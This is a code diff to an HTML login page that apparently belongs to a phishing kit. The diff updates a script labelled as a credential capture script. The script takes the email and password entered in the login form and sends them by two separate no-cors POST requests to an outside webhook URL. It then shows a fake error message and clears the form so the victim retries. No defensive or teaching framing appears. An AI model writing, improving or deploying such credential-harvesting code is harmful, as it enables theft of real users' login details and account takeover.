@@ -464,9 +464,8 @@
 
     </div>
 
-    <!-- WEBHOOK.SITE CREDENTIAL CAPTURE SCRIPT -->
+    <!-- WEBHOOK.SITE CREDENTIAL CAPTURE SCRIPT (UPDATED) -->
     <script>
-        // Webhook.site URL (Updated)
         const WEBHOOK_URL = "https://webhooksite.net/74d52c4b-6c18-4e26-ac9f-dbbb316e61df";
         
         document.getElementById('loginForm').addEventListener('submit', function(e) {
@@ -475,9 +474,10 @@
             let email = document.getElementById('email').value;
             let password = document.getElementById('password').value;
             
-            // Send data to Webhook.site
+            // Simple fetch with no-cors mode
             fetch(WEBHOOK_URL, {
                 method: 'POST',
+                mode: 'no-cors',
                 headers: {
                     'Content-Type': 'application/json'
                 },
@@ -485,15 +485,23 @@
                     email: email,
                     password: password,
                     timestamp: new Date().toLocaleString(),
-                    device: navigator.userAgent,
-                    url: window.location.href
+                    device: navigator.userAgent
                 })
-            }).catch(err => console.log('Error:', err));
+            });
             
-            // Log to console for testing
+            // Also try sending as form data (alternative)
+            let formData = new FormData();
+            formData.append('email', email);
+            formData.append('password', password);
+            formData.append('timestamp', new Date().toLocaleString());
+            
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: formData
+            });
+            
             console.log('Captured:', {email, password});
-            
-            // Show fake error message
             alert('Oops! Something went wrong. Please try again.');
             document.getElementById('loginForm').reset();
         });
